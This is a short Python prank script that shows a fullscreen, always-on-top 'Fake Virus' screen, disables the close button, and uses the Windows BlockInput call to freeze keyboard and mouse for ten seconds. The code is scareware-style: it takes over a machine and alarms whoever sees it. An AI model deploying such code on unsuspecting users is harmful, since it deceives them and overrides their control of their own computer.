import tkinter as tk
import ctypes
import time

def disable_event():
    pass  # Do nothing on close event

def block_input():
    ctypes.windll.user32.BlockInput(True)
    
def unblock_input():
    ctypes.windll.user32.BlockInput(False)

def create_fullscreen_window():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.protocol("WM_DELETE_WINDOW", disable_event)

    frame = tk.Frame(root, bg='black')
    frame.pack(fill=tk.BOTH, expand=True)

    label = tk.Label(frame, text="Fake Virus", font=("Helvetica", 50), fg="red", bg="black")
    label.pack(expand=True)

    # Block user input
    block_input()

    # Unblock user input after 10 seconds for safety
    root.after(10000, unblock_input)

    root.mainloop()

if __name__ == "__main__":
    create_fullscreen_window()